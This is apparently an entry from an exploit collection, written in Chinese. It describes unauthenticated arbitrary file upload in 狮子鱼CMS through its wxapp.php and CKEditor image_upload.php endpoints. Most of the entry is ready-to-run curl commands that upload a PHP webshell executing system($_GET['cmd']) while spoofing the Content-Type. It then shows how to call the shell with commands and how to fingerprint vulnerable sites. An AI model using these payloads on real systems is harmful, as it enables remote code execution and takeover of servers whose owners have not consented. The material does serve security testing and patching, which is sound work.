---
id: SHIZIYUCMS-MULTI-UPLOAD
title: 狮子鱼CMS 多接口任意文件上传漏洞
product: shiziyucms
vendor: 狮子鱼CMS
version_affected: "狮子鱼CMS"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产]
fingerprint: ["狮子鱼", "/seller.php?s=/Public/login"]
---

## 漏洞描述

狮子鱼CMS 存在多个未授权文件上传漏洞。CKEditor 集成的 `image_upload.php` 接口仅检查 Content-Type 不检查文件后缀，`wxapp.php` 的 `Goods.doPageUpload` 接口同样未做文件类型限制。攻击者可直接上传 PHP webshell。

## 影响版本

- 狮子鱼CMS

## 前置条件

- 无需认证

## 利用步骤

1. 通过 `wxapp.php` 或 `image_upload.php` 上传 PHP 文件
2. 通过 Content-Type 欺骗绕过类型检查
3. 访问上传的 webshell 执行命令

## Payload

### 方式一：wxapp.php 上传

```bash
curl -s "http://target/wxapp.php?controller=Goods.doPageUpload" \
  -F "upfile=@shell.php;filename=test.php;type=image/gif"
```

其中 `shell.php` 内容：`<?php system($_GET['cmd']); ?>`

### 一行式上传

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s "http://target/wxapp.php?controller=Goods.doPageUpload" \
  -F "upfile=@/tmp/shell.php;filename=cmd.php;type=image/gif"
```

### 方式二：image_upload.php 上传

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s "http://target/ckeditor/plugins/image/dialogs/image_upload.php" \
  -F "files=@/tmp/shell.php;filename=cmd.php;type=image/jpeg"
```

## 验证方法

```bash
# wxapp.php 上传后，从响应获取文件路径后访问
# image_upload 上传后文件在 uploads/ 目录下
curl -s "http://target/uploads/TIMESTAMP.php?cmd=id" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/seller.php?s=/Public/login" -o /dev/null -w "%{http_code}"
```
